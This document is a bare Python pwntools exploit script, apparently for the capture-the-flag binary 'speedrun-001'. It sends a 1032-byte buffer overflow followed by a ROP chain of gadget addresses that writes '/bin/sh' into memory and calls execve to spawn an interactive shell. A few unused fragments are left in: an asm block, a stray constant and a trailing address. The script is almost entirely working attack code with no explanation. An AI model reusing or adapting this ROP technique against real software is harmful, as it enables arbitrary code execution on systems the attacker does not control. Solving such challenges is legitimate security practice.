from pwn import *


elf = context.binary = ELF("./speedrun-001")

OFFSET = 1032
BINSH = 0x6b6100

# 0x0000000000415664 : pop rax ; ret
# 0x0000000000400686 : pop rdi ; ret
# 0x00000000004101f3 : pop rsi ; ret
# 0x000000000044be16 : pop rdx ; ret
# 0x000000000040129c : syscall
# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret

POP_RAX =  0x0000000000415664 
POP_RDI =  0x0000000000400686
POP_RSI =  0x00000000004101f3
POP_RDX =  0x000000000044be16
SYSCALL =  0x000000000040129c
MOV_ADDR_RAX_RDX = 0x000000000048d251

code = asm("""
    mov rax , 0
    mov rdi , 0
    mov rsi , 0x6b6100
    mov rdx , 0x20
    syscall
""")

p = process()

0x68732f2f6e69622f

payload = flat([
    b"A" * OFFSET,
    POP_RDX,
    0x6e69622f,
    POP_RAX,
    0x6b6100,
    MOV_ADDR_RAX_RDX,
    POP_RDX,
    0x68732f,
    POP_RAX,
    0x6b6104,
    MOV_ADDR_RAX_RDX,

    POP_RAX,
    0x3b,
    POP_RDI,
    0x6b6100,
    POP_RSI,
    0x0,
    POP_RDX,
    0x0,
    SYSCALL,
])



p.sendline(payload)

p.interactive()

0x400bad